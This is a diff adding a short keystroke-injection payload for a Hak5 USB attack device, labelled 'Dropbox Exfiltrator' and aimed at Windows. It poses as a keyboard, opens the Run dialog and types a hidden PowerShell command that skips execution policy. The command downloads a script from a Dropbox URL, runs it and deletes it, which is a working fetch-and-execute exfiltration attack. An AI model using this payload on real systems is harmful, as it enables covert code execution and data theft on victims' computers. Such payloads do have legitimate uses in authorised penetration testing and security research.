@@ -1,0 +1,15 @@
+# Dropbox Exfiltrator
+# Author: Hak5Darren
+# Props: jimcola99 Buchanan
+# Demo: Hak5 episode 2505
+# Target: Windows Vista+
+# Category: Exfiltration
+
+LED SETUP
+ATTACKMODE HID
+LED ATTACK
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell -w h -NoP -NonI -Exec Bypass \"\$e=\\\"\$env:TMP/e.ps1\\\"\;iwr https://www.dropbox.com/s/61jx6u40orxmvzz/exfil.ps1?dl=1 -O \$e\;iex \$e\;rm \$e\"
+QUACK ENTER
+LED FINISH
